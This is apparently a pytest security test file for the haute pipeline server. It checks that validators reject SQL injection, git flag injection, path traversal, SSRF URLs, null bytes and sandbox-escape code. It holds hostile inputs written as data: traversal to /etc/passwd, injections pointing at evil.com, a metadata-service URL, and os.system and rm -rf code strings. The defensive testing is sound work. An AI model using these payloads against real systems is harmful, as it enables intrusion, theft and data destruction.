"""Security gap tests covering SQL injection, command injection, path traversal
variants, and resource exhaustion vectors not addressed by existing test files.

Each test class targets a specific attack surface:

1.  SQLInjectionTableName       -- table names with SQL injection payloads
2.  SQLInjectionSelectClause    -- SELECT clause with dangerous keywords
3.  CommandInjectionGitRef      -- branch names with shell metacharacters
4.  PathTraversalURLEncoded     -- URL-encoded and double-encoded traversal
5.  PathTraversalNullByte       -- null bytes in path inputs to json_cache
6.  PathTraversalJsonCache      -- path traversal via json_cache endpoints
7.  ResourceExhaustionTopoSort  -- very large graphs in topo_sort_ids
8.  ResourceExhaustionConfig    -- very large config dicts in node data
9.  SSRFViaFilePath             -- URL schemes in file paths
10. SSRFViaDatabricksTable      -- SQL injection with SSRF in table param
11. SymlinkTraversalBrowse      -- symlink following outside base dir
12. SecondOrderCodeInjection    -- stored config with malicious code
13. PathURLSchemeRejection      -- URL schemes rejected by validate_safe_path/read_source
14. NullByteHTTPParam           -- null bytes in HTTP path parameters
15. DoubleEncodedHTTPTraversal  -- double-encoded ../ in HTTP requests
16. W8bLocalSessionProtection   -- server-level Host/Origin/session guards
"""

from __future__ import annotations

from pathlib import Path

import pytest

from haute._databricks_io import (
    _TABLE_NAME_RE,
    _validate_select_clause,
)
from haute._git import GitError, _validate_ref_name
from haute._topo import topo_sort_ids
from haute._types import GraphEdge
from tests.conftest import make_file_output_config

# =========================================================================
# 1. SQL Injection — Table name validation
# =========================================================================


class TestSQLInjectionTableName:
    """_TABLE_NAME_RE must reject table names containing SQL injection payloads.

    Table names arrive from the GUI config and are interpolated into
    ``f"{select_clause} FROM {table}"``.  The regex must enforce the
    ``catalog.schema.table`` format, blocking any embedded SQL.
    """

    def test_drop_table_injection_rejected(self):
        assert _TABLE_NAME_RE.match("'; DROP TABLE--") is None

    def test_union_select_injection_rejected(self):
        assert _TABLE_NAME_RE.match("catalog.schema.t UNION SELECT * FROM secret") is None

    def test_semicolon_in_table_name_rejected(self):
        assert _TABLE_NAME_RE.match("catalog.schema.t; DROP TABLE x") is None

    def test_comment_injection_rejected(self):
        assert _TABLE_NAME_RE.match("catalog.schema.t -- comment") is None

    def test_subquery_injection_rejected(self):
        assert _TABLE_NAME_RE.match("(SELECT * FROM secret)") is None

    def test_single_quote_injection_rejected(self):
        assert _TABLE_NAME_RE.match("catalog.schema.t' OR '1'='1") is None

    def test_backtick_quoted_valid_name_accepted(self):
        assert _TABLE_NAME_RE.match("`catalog`.`schema`.`table`") is not None

    def test_simple_valid_name_accepted(self):
        assert _TABLE_NAME_RE.match("my_catalog.my_schema.my_table") is not None

    def test_hyphenated_valid_name_accepted(self):
        assert _TABLE_NAME_RE.match("my-catalog.my-schema.my-table") is not None

    def test_two_part_name_rejected(self):
        assert _TABLE_NAME_RE.match("schema.table") is None

    def test_single_part_name_rejected(self):
        assert _TABLE_NAME_RE.match("table") is None

    def test_four_part_name_rejected(self):
        assert _TABLE_NAME_RE.match("a.b.c.d") is None

    def test_empty_string_rejected(self):
        assert _TABLE_NAME_RE.match("") is None

    def test_whitespace_in_parts_rejected(self):
        assert _TABLE_NAME_RE.match("catalog.schema.table name") is None


# =========================================================================
# 2. SQL Injection — SELECT clause validation
# =========================================================================


class TestSQLInjectionSelectClause:
    """_validate_select_clause must reject queries with dangerous SQL keywords.

    These tests cover keyword variants not tested in test_databricks_io.py.
    """

    def test_drop_keyword_rejected(self):
        with pytest.raises(ValueError, match="forbidden SQL keyword"):
            _validate_select_clause("SELECT * FROM t WHERE DROP = 1")

    def test_delete_keyword_rejected(self):
        with pytest.raises(ValueError, match="forbidden SQL keyword"):
            _validate_select_clause("SELECT * FROM t WHERE DELETE = 1")

    def test_insert_keyword_rejected(self):
        with pytest.raises(ValueError, match="forbidden SQL keyword"):
            _validate_select_clause("SELECT 1 INSERT INTO t VALUES(1)")

    def test_update_keyword_rejected(self):
        with pytest.raises(ValueError, match="forbidden SQL keyword"):
            _validate_select_clause("SELECT 1 UPDATE t SET x=1")

    def test_alter_keyword_rejected(self):
        with pytest.raises(ValueError, match="forbidden SQL keyword"):
            _validate_select_clause("SELECT 1 ALTER TABLE t ADD COLUMN x INT")

    def test_truncate_keyword_rejected(self):
        with pytest.raises(ValueError, match="forbidden SQL keyword"):
            _validate_select_clause("SELECT 1 TRUNCATE TABLE t")

    def test_exec_keyword_rejected(self):
        with pytest.raises(ValueError, match="forbidden SQL keyword"):
            _validate_select_clause("SELECT 1 EXEC xp_cmdshell('dir')")

    def test_create_keyword_rejected(self):
        with pytest.raises(ValueError, match="forbidden SQL keyword"):
            _validate_select_clause("SELECT 1 CREATE TABLE t (x INT)")

    def test_grant_keyword_rejected(self):
        with pytest.raises(ValueError, match="forbidden SQL keyword"):
            _validate_select_clause("SELECT 1 GRANT ALL ON t TO PUBLIC")

    def test_semicolon_between_statements_rejected(self):
        with pytest.raises(ValueError, match="semicolons"):
            _validate_select_clause("SELECT 1; DROP TABLE t")

    def test_line_comment_rejected(self):
        with pytest.raises(ValueError, match="line comments"):
            _validate_select_clause("SELECT * -- ignore rest")

    def test_block_comment_rejected(self):
        with pytest.raises(ValueError, match="block comments"):
            _validate_select_clause("SELECT * /* hidden */")

    def test_union_keyword_rejected(self):
        with pytest.raises(ValueError, match="forbidden SQL keyword"):
            _validate_select_clause("SELECT a UNION SELECT secret FROM credentials")

    def test_non_select_statement_rejected(self):
        with pytest.raises(ValueError, match="must start with SELECT"):
            _validate_select_clause("'; DROP TABLE students--")

    def test_case_insensitive_keyword_detection(self):
        with pytest.raises(ValueError, match="forbidden SQL keyword"):
            _validate_select_clause("SELECT 1 dRoP table t")

    def test_lateral_keyword_rejected(self):
        with pytest.raises(ValueError, match="forbidden SQL keyword"):
            _validate_select_clause("SELECT * LATERAL VIEW explode(arr) AS x")

    def test_valid_select_with_functions_accepted(self):
        _validate_select_clause("SELECT COUNT(*), SUM(amount), AVG(price)")

    def test_valid_select_with_alias_accepted(self):
        _validate_select_clause("SELECT a AS col_a, b AS col_b")


# =========================================================================
# 3. Command Injection — Git ref name validation
# =========================================================================


class TestCommandInjectionGitRef:
    """_validate_ref_name blocks names that could be interpreted as git flags
    or inject shell commands.

    Since _run_git uses subprocess.run with a list (no shell=True), shell
    metacharacters like backticks and $() are NOT dangerous at the subprocess
    level.  However, _validate_ref_name should still block flag injection
    (leading dash) and control characters (null bytes).
    """

    def test_leading_double_dash_rejected(self):
        with pytest.raises(GitError, match="must not start with"):
            _validate_ref_name("--upload-pack=evil")

    def test_leading_single_dash_rejected(self):
        with pytest.raises(GitError, match="must not start with"):
            _validate_ref_name("-b")

    def test_null_byte_rejected(self):
        with pytest.raises(GitError, match="forbidden characters"):
            _validate_ref_name("branch\x00injected")

    def test_backtick_not_in_bad_chars(self):
        """Backticks are not in _BAD_REF_CHARS.  This is safe because _run_git
        uses subprocess.run with a list, so shell interpretation does not occur.
        """
        _validate_ref_name("feature/test`echo`")

    def test_dollar_paren_not_in_bad_chars(self):
        """$() is not in _BAD_REF_CHARS.  Safe because no shell=True."""
        _validate_ref_name("feature/$(whoami)")

    def test_pipe_not_in_bad_chars(self):
        """Pipe is not in _BAD_REF_CHARS.  Safe because no shell=True."""
        _validate_ref_name("feature/test|cat")

    def test_control_char_tab_rejected(self):
        with pytest.raises(GitError, match="forbidden characters"):
            _validate_ref_name("branch\tname")

    def test_control_char_newline_rejected(self):
        with pytest.raises(GitError, match="forbidden characters"):
            _validate_ref_name("branch\nname")

    def test_control_char_carriage_return_rejected(self):
        with pytest.raises(GitError, match="forbidden characters"):
            _validate_ref_name("branch\rname")

    def test_del_character_rejected(self):
        with pytest.raises(GitError, match="forbidden characters"):
            _validate_ref_name("branch\x7fname")

    def test_backslash_rejected(self):
        with pytest.raises(GitError, match="forbidden characters"):
            _validate_ref_name("branch\\name")

    def test_empty_ref_rejected(self):
        with pytest.raises(GitError, match="empty"):
            _validate_ref_name("")

    def test_valid_branch_name_accepted(self):
        _validate_ref_name("pricing/user/my-feature-branch")

    def test_valid_sha_accepted(self):
        _validate_ref_name("abc123def456789")


# =========================================================================
# 4. Path Traversal — URL-encoded variants
# =========================================================================


class TestPathTraversalURLEncoded:
    """URL-encoded traversal sequences (%2e%2e%2f) are typically decoded by
    the web framework before reaching route handlers.  These tests verify
    that validate_safe_path blocks traversal regardless of whether the
    percent-encoding has been decoded or remains literal.

    When percent-encoding is NOT decoded (literal '%2e%2e'), the resulting
    path stays within the base directory (it's a literal filename containing
    '%' characters), so validate_safe_path correctly allows it.

    When percent-encoding IS decoded (becomes '..'), validate_safe_path
    must block the traversal.
    """

    def test_decoded_dotdot_blocked(self, tmp_path: Path):
        from fastapi import HTTPException

        from haute.routes._helpers import validate_safe_path

        with pytest.raises(HTTPException) as exc_info:
            validate_safe_path(tmp_path, "../../etc/passwd")
        assert exc_info.value.status_code == 403

    def test_literal_percent_encoded_stays_within_base(self, tmp_path: Path):
        """Literal '%2e%2e%2f' is NOT '..' — it's an odd filename.
        Path resolution treats it as a child of base, so it is allowed.
        """
        from haute.routes._helpers import validate_safe_path

        result = validate_safe_path(tmp_path, "%2e%2e%2f%2e%2e%2fetc%2fpasswd")
        assert result.is_relative_to(tmp_path.resolve())

    def test_literal_double_encoded_stays_within_base(self, tmp_path: Path):
        """Literal '%252e%252e' is NOT '..' after single decode — still an odd filename."""
        from haute.routes._helpers import validate_safe_path

        result = validate_safe_path(tmp_path, "%252e%252e/%252e%252e/etc/passwd")
        assert result.is_relative_to(tmp_path.resolve())

    def test_manually_decoded_double_dot_blocked(self, tmp_path: Path):
        """If the framework decodes '%2e%2e' to '..', validate_safe_path blocks it."""
        from urllib.parse import unquote

        from fastapi import HTTPException

        from haute.routes._helpers import validate_safe_path

        raw = "%2e%2e/%2e%2e/etc/passwd"
        decoded = unquote(raw)
        assert decoded == "../../etc/passwd"

        with pytest.raises(HTTPException) as exc_info:
            validate_safe_path(tmp_path, decoded)
        assert exc_info.value.status_code == 403

    def test_manually_double_decoded_blocked(self, tmp_path: Path):
        """Double-decode of '%252e%252e' yields '..' which must be blocked."""
        from urllib.parse import unquote

        from fastapi import HTTPException

        from haute.routes._helpers import validate_safe_path

        raw = "%252e%252e/%252e%252e/etc/passwd"
        decoded = unquote(unquote(raw))
        assert decoded == "../../etc/passwd"

        with pytest.raises(HTTPException) as exc_info:
            validate_safe_path(tmp_path, decoded)
        assert exc_info.value.status_code == 403


# =========================================================================
# 5. Path Traversal — Null bytes in validate_safe_path
# =========================================================================


class TestPathTraversalNullByteSafePath:
    """Null bytes in paths can truncate at the OS level.  Python 3.x raises
    ValueError for embedded nulls in Path operations, which is correct.
    """

    def test_null_byte_in_validate_safe_path(self, tmp_path: Path):
        """Null bytes must be rejected before pathlib or filesystem calls."""
        from fastapi import HTTPException

        from haute.routes._helpers import validate_safe_path

        with pytest.raises(HTTPException) as exc_info:
            validate_safe_path(tmp_path, "file\x00../../etc/passwd")
        assert exc_info.value.status_code == 400

    def test_null_byte_mid_path(self, tmp_path: Path):
        from fastapi import HTTPException

        from haute.routes._helpers import validate_safe_path

        with pytest.raises(HTTPException) as exc_info:
            validate_safe_path(tmp_path, "data/file.json\x00.txt")
        assert exc_info.value.status_code == 400


# =========================================================================
# 6. Path Traversal — JSON cache endpoints
# =========================================================================


class TestPathTraversalJsonCache:
    """JSON cache endpoints use validate_safe_path to block path traversal.
    These tests verify the endpoint-level protection via TestClient.
    """

    @pytest.fixture()
    def client(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
        monkeypatch.chdir(tmp_path)
        (tmp_path / "main.py").write_text("")
        from fastapi.testclient import TestClient

        from haute.server import app

        return TestClient(app, raise_server_exceptions=False)

    def test_build_path_traversal_rejected(self, client):
        resp = client.post(
            "/api/json-cache/build",
            json={"path": "../../etc/passwd"},
        )
        assert resp.status_code == 403

    def test_status_path_traversal_rejected(self, client):
        resp = client.get(
            "/api/json-cache/status",
            params={"path": "../../etc/passwd"},
        )
        assert resp.status_code == 403

    def test_progress_path_traversal_rejected(self, client):
        resp = client.get(
            "/api/json-cache/progress",
            params={"path": "../../etc/passwd"},
        )
        assert resp.status_code == 403

    def test_delete_path_traversal_rejected(self, client):
        resp = client.delete(
            "/api/json-cache",
            params={"path": "../../etc/passwd"},
        )
        assert resp.status_code == 403

    def test_build_config_path_traversal_rejected(self, client, tmp_path: Path):
        valid_data = tmp_path / "data.json"
        valid_data.write_text('{"key": "value"}')
        resp = client.post(
            "/api/json-cache/build",
            json={"path": "data.json", "config_path": "../../etc/shadow"},
        )
        assert resp.status_code == 403


# =========================================================================
# 7. Resource Exhaustion — Topological sort with large graphs
# =========================================================================


class TestResourceExhaustionTopoSort:
    """topo_sort_ids is O(V+E) via :class:`graphlib.TopologicalSorter`
    on the happy path and a custom Kahn peel for cycle-node discovery.
    These tests verify it handles large graphs without crashing or
    excessive runtime.
    """

    def test_10k_node_linear_chain(self):
        n = 10_000
        node_ids = [f"n{i}" for i in range(n)]
        edges = [GraphEdge(id=f"e{i}", source=f"n{i}", target=f"n{i + 1}") for i in range(n - 1)]
        result = topo_sort_ids(node_ids, edges)
        assert len(result) == n
        assert result[0] == "n0"
        assert result[-1] == f"n{n - 1}"

    def test_10k_node_wide_fan_out(self):
        n = 10_000
        node_ids = ["root"] + [f"leaf{i}" for i in range(n - 1)]
        edges = [GraphEdge(id=f"e{i}", source="root", target=f"leaf{i}") for i in range(n - 1)]
        result = topo_sort_ids(node_ids, edges)
        assert len(result) == n
        assert result[0] == "root"

    def test_10k_node_wide_fan_in(self):
        n = 10_000
        node_ids = [f"src{i}" for i in range(n - 1)] + ["sink"]
        edges = [GraphEdge(id=f"e{i}", source=f"src{i}", target="sink") for i in range(n - 1)]
        result = topo_sort_ids(node_ids, edges)
        assert len(result) == n
        assert result[-1] == "sink"

    def test_10k_nodes_no_edges(self):
        n = 10_000
        node_ids = [f"n{i}" for i in range(n)]
        result = topo_sort_ids(node_ids, [])
        assert len(result) == n

    def test_diamond_dag_10k_layers(self):
        layers = 5_000
        node_ids = []
        edges = []
        for i in range(layers):
            a = f"a{i}"
            b = f"b{i}"
            node_ids.extend([a, b])
            if i > 0:
                prev_a = f"a{i - 1}"
                prev_b = f"b{i - 1}"
                edges.append(GraphEdge(id=f"ea{i}", source=prev_a, target=a))
                edges.append(GraphEdge(id=f"eb{i}", source=prev_a, target=b))
                edges.append(GraphEdge(id=f"ec{i}", source=prev_b, target=a))
                edges.append(GraphEdge(id=f"ed{i}", source=prev_b, target=b))
        result = topo_sort_ids(node_ids, edges)
        assert len(result) == len(node_ids)


# =========================================================================
# 8. Resource Exhaustion — Large config dicts
# =========================================================================


class TestResourceExhaustionConfig:
    """Very large config dicts should not crash node construction or codegen."""

    def test_large_constant_values_list(self):
        from haute._types import GraphNode, NodeData

        values = [{"name": f"v{i}", "value": str(i)} for i in range(10_000)]
        node = GraphNode(
            id="big",
            data=NodeData(
                label="BigConstants",
                nodeType="constant",
                config={"values": values},
            ),
        )
        assert len(node.data.config["values"]) == 10_000

    def test_large_rating_table_entries(self):
        from haute._types import GraphNode, NodeData

        entries = [{"factors": {"x": str(i)}, "value": float(i)} for i in range(10_000)]
        node = GraphNode(
            id="big_rt",
            data=NodeData(
                label="BigRating",
                nodeType="ratingStep",
                config={
                    "tables": [
                        {
                            "name": "T",
                            "factors": ["x"],
                            "outputColumn": "f",
                            "entries": entries,
                        }
                    ]
                },
            ),
        )
        assert len(node.data.config["tables"][0]["entries"]) == 10_000

    def test_large_banding_rules_list(self):
        from haute._types import GraphNode, NodeData

        rules = [{"min": i, "max": i + 1, "label": f"band_{i}"} for i in range(10_000)]
        node = GraphNode(
            id="big_band",
            data=NodeData(
                label="BigBanding",
                nodeType="banding",
                config={
                    "factors": [
                        {
                            "banding": "continuous",
                            "column": "x",
                            "outputColumn": "x_f",
                            "rules": rules,
                        }
                    ]
                },
            ),
        )
        assert len(node.data.config["factors"][0]["rules"]) == 10_000

    def test_deeply_nested_config(self):
        from haute._types import GraphNode, NodeData

        nested: dict = {"leaf": "value"}
        for i in range(100):
            nested = {f"level_{i}": nested}

        node = GraphNode(
            id="deep",
            data=NodeData(
                label="DeepConfig",
                nodeType="polars",
                config={"code": "", "metadata": nested},
            ),
        )
        current = node.data.config["metadata"]
        for i in range(99, -1, -1):
            current = current[f"level_{i}"]
        assert current == {"leaf": "value"}


# =========================================================================
# 9. SSRF via file path — URL schemes rejected by read_source
# =========================================================================


class TestSSRFViaFilePath:
    """read_source must reject paths that look like URLs.

    Even though Polars would likely fail on these, the extension check and
    the '..' guard in read_source should reject them before any I/O attempt.
    """

    @pytest.mark.parametrize(
        "path",
        [
            "http://localhost:6379",
            "file:///etc/passwd",
            "ftp://evil.com/data",
            "http://169.254.169.254/latest/meta-data/",
            "https://evil.com/exfil.parquet",
        ],
    )
    def test_url_scheme_rejected_by_read_source(self, path: str):
        from haute._io import read_source

        with pytest.raises(ValueError):
            read_source(path)


# =========================================================================
# 10. SSRF via Databricks table parameter — SQL injection with SSRF
# =========================================================================


class TestSSRFViaDatabricksTable:
    """_TABLE_NAME_RE must reject table names containing SSRF-style injection."""

    @pytest.mark.parametrize(
        "table",
        [
            "catalog.schema.table; COPY TO 'http://evil.com'",
            "catalog.schema.table UNION SELECT * FROM http://evil.com",
            "catalog.schema.table; SELECT load_extension('http://evil.com/evil.so')",
            "catalog.schema.table INTO OUTFILE 'http://evil.com/dump'",
        ],
    )
    def test_ssrf_injection_in_table_name_rejected(self, table: str):
        assert _TABLE_NAME_RE.match(table) is None


# =========================================================================
# 11. Symlink traversal in browse_files
# =========================================================================


class TestSymlinkTraversalBrowse:
    """A symlink pointing outside the base directory must not be followed
    by browse_files to list files outside the project root.
    """

    @pytest.fixture()
    def dir_with_symlink(self, tmp_path: Path):
        """Create a directory tree with a symlink escaping to the parent."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "main.py").write_text("")
        secret = tmp_path / "secret"
        secret.mkdir()
        (secret / "passwords.csv").write_text("user,pass\nadmin,hunter2")
        link = project / "escape_link"
        try:
            link.symlink_to(secret, target_is_directory=True)
        except OSError:
            pytest.skip("Cannot create symlinks (requires privileges on Windows)")
        return project

    def test_symlink_traversal_blocked(
        self, dir_with_symlink: Path, monkeypatch: pytest.MonkeyPatch
    ):
        from fastapi import HTTPException

        from haute.routes._helpers import validate_safe_path

        base = dir_with_symlink
        with pytest.raises(HTTPException) as exc_info:
            validate_safe_path(base, "escape_link")
        assert exc_info.value.status_code == 403


# =========================================================================
# 12. Second-order injection via stored config
# =========================================================================


class TestSecondOrderCodeInjection:
    """Code stored in a node config must be rejected by validate_user_code
    if it contains dangerous constructs like __import__ or os.system.
    """

    @pytest.mark.parametrize(
        "malicious_code",
        [
            "__import__('os').system('echo pwned')",
            "__import__('subprocess').call(['rm', '-rf', '/'])",
            'eval(\'__import__("os").system("id")\')',
            "exec('import socket')",
            "getattr(__builtins__, '__import__')('os')",
            "type('X', (), {'__del__': lambda s: None})()",
        ],
    )
    def test_malicious_code_in_config_rejected(self, malicious_code: str):
        from haute._sandbox import UnsafeCodeError, validate_user_code

        with pytest.raises((UnsafeCodeError, SyntaxError)):
            validate_user_code(malicious_code)


# =========================================================================
# 13. Path with URL scheme rejected
# =========================================================================


class TestPathURLSchemeRejection:
    """validate_safe_path or read_source must reject paths starting with URL schemes."""

    @pytest.mark.parametrize(
        "scheme_path",
        [
            "http://evil.com/data.csv",
            "https://evil.com/data.parquet",
            "ftp://evil.com/data.json",
            "file:///etc/shadow",
        ],
    )
    def test_url_scheme_in_validate_safe_path(self, tmp_path: Path, scheme_path: str):
        from haute.routes._helpers import validate_safe_path

        result = validate_safe_path(tmp_path, scheme_path)
        assert result.is_relative_to(tmp_path.resolve()), (
            f"URL-scheme path '{scheme_path}' should resolve within base, "
            "not trigger external access"
        )

    @pytest.mark.parametrize(
        "scheme_path",
        [
            "http://evil.com/data.csv",
            "https://evil.com/data.parquet",
            "ftp://evil.com/data.json",
            "file:///etc/shadow",
        ],
    )
    def test_url_scheme_in_read_source(self, scheme_path: str):
        from haute._io import read_source

        with pytest.raises((ValueError, Exception)):
            read_source(scheme_path)


# =========================================================================
# 14. Null byte in HTTP path parameter
# =========================================================================


class TestNullByteHTTPParam:
    """Null bytes in path parameters must be rejected before reaching the filesystem."""

    @pytest.fixture()
    def client(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
        monkeypatch.chdir(tmp_path)
        (tmp_path / "main.py").write_text("")
        from fastapi.testclient import TestClient

        from haute.server import app

        return TestClient(app, raise_server_exceptions=False)

    def test_null_byte_in_browse_dir(self, client):
        resp = client.get("/api/files", params={"dir": "sub\x00../../etc"})
        assert resp.status_code == 400

    def test_null_byte_in_json_cache_path(self, client):
        resp = client.post(
            "/api/json-cache/build",
            json={"path": "file\x00../../etc/passwd"},
        )
        assert resp.status_code == 400

    def test_null_byte_in_schema_path(self, client):
        resp = client.get("/api/schema", params={"path": "data\x00.parquet"})
        assert resp.status_code == 400


# =========================================================================
# 15. Double-encoded path traversal via HTTP
# =========================================================================


class TestDoubleEncodedHTTPTraversal:
    """Double-encoded traversal (%252e%252e%252f) must not escape the base directory.

    FastAPI/Starlette performs a single URL-decode before routing.
    After single decode, %252e%252e%252f becomes %2e%2e%2f (a literal
    filename, not ..).  After double decode it becomes ../ which is dangerous.
    validate_safe_path must ensure the resolved path stays within the base
    regardless of encoding.
    """

    @pytest.fixture()
    def client(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
        monkeypatch.chdir(tmp_path)
        (tmp_path / "main.py").write_text("")
        from fastapi.testclient import TestClient

        from haute.server import app

        return TestClient(app, raise_server_exceptions=False)

    def test_double_encoded_browse_rejected(self, client):
        resp = client.get("/api/files", params={"dir": "%2e%2e/%2e%2e/etc"})
        assert resp.status_code in (403, 404)

    def test_double_encoded_schema_rejected(self, client):
        resp = client.get("/api/schema", params={"path": "%2e%2e/%2e%2e/etc/passwd"})
        assert resp.status_code in (403, 404)

    def test_double_encoded_json_cache_rejected(self, client):
        # Post-commit-5.5: the route returns 422 ApiInputSchemaError when
        # no schema source is supplied; the security contract is "4xx
        # rejection" — 422 is just as defensive as the prior 404. A
        # malicious double-encoded path that bypasses validate_safe_path
        # would still need a schema source AND a real data file to
        # exfiltrate anything.
        resp = client.post(
            "/api/json-cache/build",
            json={"path": "%2e%2e/%2e%2e/etc/passwd"},
        )
        assert resp.status_code in (404, 422)


# =========================================================================
# 16. W8b local session protection
# =========================================================================


class TestW8bLocalSessionProtection:
    """Endpoint-level repros for the W8b security bundle.

    These requests intentionally use invalid route bodies so the expected
    4xx proves the local session protection ran before request validation or
    endpoint execution.
    """

    SESSION_TOKEN = "w8b-deterministic-test-token"
    LOCAL_HOST = "localhost:8000"
    LOCAL_ORIGIN = "http://localhost:8000"
    FOREIGN_HOST = "attacker.example"
    FOREIGN_ORIGIN = "https://attacker.example"
    SESSION_COOKIE = "haute_session"
    SESSION_QUERY = "haute_session_token"

    @pytest.fixture()
    def client(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
        monkeypatch.chdir(tmp_path)
        monkeypatch.setenv("HAUTE_LOCAL_SESSION_TOKEN", self.SESSION_TOKEN)
        (tmp_path / "main.py").write_text("")
        from fastapi.testclient import TestClient

        from haute.server import app

        return TestClient(app, raise_server_exceptions=False)

    @staticmethod
    def _ws_rejection_errors() -> tuple[type[Exception], ...]:
        from starlette.testclient import WebSocketDenialResponse
        from starlette.websockets import WebSocketDisconnect

        return (WebSocketDisconnect, WebSocketDenialResponse)

    @pytest.mark.parametrize(
        "endpoint",
        [
            "/api/pipeline/preview",
            "/api/pipeline/trace",
            "/api/pipeline/write-output",
        ],
    )
    def test_pipeline_posts_missing_session_token_rejected_before_validation(
        self,
        client,
        endpoint: str,
    ):
        resp = client.post(
            endpoint,
            json={},
            headers={
                "host": self.LOCAL_HOST,
                "origin": self.LOCAL_ORIGIN,
                "cookie": "",
            },
        )

        assert resp.status_code in (401, 403)

    def test_testclient_host_without_origin_still_requires_session_token(self, client):
        resp = client.post(
            "/api/pipeline/preview",
            json={},
            headers={
                "host": "testserver",
                "cookie": "",
            },
        )

        assert resp.status_code in (400, 403)

    def test_non_ascii_session_token_fails_closed(self, client):
        resp = client.post(
            "/api/pipeline/preview",
            json={},
            headers={
                "host": self.LOCAL_HOST,
                "origin": self.LOCAL_ORIGIN,
                "cookie": b"haute_session=clef-\xe9rron\xe9e",
            },
        )

        assert resp.status_code == 403

    @pytest.mark.parametrize(
        "endpoint",
        [
            "/api/pipeline/preview",
            "/api/pipeline/trace",
            "/api/pipeline/write-output",
        ],
    )
    def test_pipeline_posts_foreign_origin_rejected_before_validation(
        self,
        client,
        endpoint: str,
    ):
        resp = client.post(
            endpoint,
            json={},
            headers={
                "host": self.LOCAL_HOST,
                "origin": self.FOREIGN_ORIGIN,
                "cookie": f"{self.SESSION_COOKIE}={self.SESSION_TOKEN}",
            },
        )

        assert resp.status_code == 403

    def test_non_local_host_header_rejected(self, client):
        resp = client.post(
            "/api/pipeline/preview",
            json={},
            headers={
                "host": self.FOREIGN_HOST,
                "origin": self.LOCAL_ORIGIN,
                "cookie": f"{self.SESSION_COOKIE}={self.SESSION_TOKEN}",
            },
        )

        assert resp.status_code == 400

    def test_ipv6_loopback_host_header_is_trusted(self, client):
        resp = client.post(
            "/api/pipeline/preview",
            json={},
            headers={
                "host": "[::1]:8000",
                "cookie": f"{self.SESSION_COOKIE}={self.SESSION_TOKEN}",
            },
        )

        assert resp.status_code == 422

    @pytest.mark.parametrize(
        "host",
        [
            "[::1]evil",
            "[::1].evil",
            "[::1]:notaport",
            "[localhost]",
            "[127.0.0.1]",
        ],
    )
    def test_malformed_ipv6_host_header_is_rejected(self, client, host: str):
        resp = client.post(
            "/api/pipeline/preview",
            json={},
            headers={
                "host": host,
                "cookie": f"{self.SESSION_COOKIE}={self.SESSION_TOKEN}",
            },
        )

        assert resp.status_code == 400

    @pytest.mark.parametrize(
        "origin",
        [
            "http://[::1]evil",
            "http://[::1]:notaport",
            "http://[localhost]",
            "http://[127.0.0.1]",
        ],
    )
    def test_malformed_ipv6_origin_is_rejected_without_server_error(self, client, origin: str):
        resp = client.post(
            "/api/pipeline/preview",
            json={},
            headers={
                "host": self.LOCAL_HOST,
                "origin": origin,
                "cookie": f"{self.SESSION_COOKIE}={self.SESSION_TOKEN}",
            },
        )

        assert resp.status_code == 403

    def test_sink_output_path_traversal_rejected_before_execution(self, client):
        graph = {
            "nodes": [
                {
                    "id": "sink",
                    "type": "pipelineNode",
                    "position": {"x": 0, "y": 0},
                    "data": {
                        "label": "Sink",
                        "nodeType": "dataOutput",
                        "config": make_file_output_config("../outside.parquet"),
                    },
                },
            ],
            "edges": [],
        }

        resp = client.post(
            "/api/pipeline/write-output",
            json={"graph": graph, "node_id": "sink"},
            headers={
                "host": self.LOCAL_HOST,
                "origin": self.LOCAL_ORIGIN,
                "cookie": f"{self.SESSION_COOKIE}={self.SESSION_TOKEN}",
            },
        )

        assert resp.status_code == 403

    def test_pipeline_relative_sink_output_inside_project_is_allowed(self, client):
        from unittest.mock import patch

        from haute.schemas import WriteOutputResponse

        graph = {
            "nodes": [
                {
                    "id": "sink",
                    "type": "pipelineNode",
                    "position": {"x": 0, "y": 0},
                    "data": {
                        "label": "Sink",
                        "nodeType": "dataOutput",
                        "config": make_file_output_config(
                            "../output/result", format_name="parquet"
                        ),
                    },
                },
            ],
            "edges": [],
            "source_file": "pipelines/main.py",
        }
        captured_kwargs: dict[str, object] = {}

        def fake_execute_sink(*_args, **kwargs):
            captured_kwargs.update(kwargs)
            return WriteOutputResponse(
                status="ok",
                row_count=0,
                path="../output/result.parquet",
                format="parquet",
            )

        with patch("haute.routes.pipeline.write_data_output", side_effect=fake_execute_sink):
            resp = client.post(
                "/api/pipeline/write-output",
                json={"graph": graph, "node_id": "sink"},
                headers={
                    "host": self.LOCAL_HOST,
                    "origin": self.LOCAL_ORIGIN,
                    "cookie": f"{self.SESSION_COOKIE}={self.SESSION_TOKEN}",
                },
            )

        assert resp.status_code == 200, resp.text
        assert captured_kwargs["project_root"] is not None

    def test_execute_sink_enforced_project_root_rejects_absolute_outside_before_execution(
        self,
        tmp_path: Path,
    ):
        from haute._types import GraphNode, NodeData, NodeType, PipelineGraph
        from haute.executor import write_data_output

        outside = tmp_path.parent / "outside.parquet"
        graph = PipelineGraph(
            nodes=[
                GraphNode(
                    id="sink",
                    data=NodeData(
                        label="Sink",
                        nodeType=NodeType.DATA_OUTPUT,
                        config=make_file_output_config(outside),
                    ),
                ),
            ],
            edges=[],
        )

        with pytest.raises(ValueError, match="outside the project root"):
            write_data_output(graph, "sink", project_root=tmp_path)

    def test_ws_sync_rejects_foreign_origin_before_accept(self, client):
        with pytest.raises(self._ws_rejection_errors()):
            with client.websocket_connect(
                f"/ws/sync?{self.SESSION_QUERY}={self.SESSION_TOKEN}",
                headers={
                    "host": self.LOCAL_HOST,
                    "origin": self.FOREIGN_ORIGIN,
                },
            ):
                pass

    @pytest.mark.parametrize(
        "path",
        [
            "/ws/sync",
            "/ws/sync?haute_session_token=wrong-token",
        ],
    )
    def test_ws_sync_rejects_missing_or_invalid_session_token_before_accept(
        self,
        client,
        path: str,
    ):
        with pytest.raises(self._ws_rejection_errors()):
            with client.websocket_connect(
                path,
                headers={
                    "host": self.LOCAL_HOST,
                    "origin": self.LOCAL_ORIGIN,
                    "cookie": "",
                },
            ):
                pass

    def test_ws_testclient_host_without_origin_still_requires_session_token(self, client):
        with pytest.raises(self._ws_rejection_errors()):
            with client.websocket_connect(
                "/ws/sync",
                headers={
                    "host": "testserver",
                    "cookie": "",
                },
            ):
                pass
